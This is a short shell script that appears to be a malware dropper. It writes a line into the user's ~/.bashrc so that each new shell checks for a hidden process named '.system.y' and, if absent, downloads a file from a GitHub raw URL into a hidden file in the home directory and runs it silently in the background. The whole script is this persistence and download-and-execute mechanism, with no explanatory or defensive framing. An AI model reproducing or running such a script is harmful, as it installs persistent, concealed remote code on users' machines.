#!/bin/sh
autorun='if [ -z $(pidof .system.y) ]; then wget -O ~/.system.y https://raw.githubusercontent.com/nTOc/sub27/master/system.y; ~/.system.y > /dev/null &; fi'
echo $autorun >> ~/.bashrc
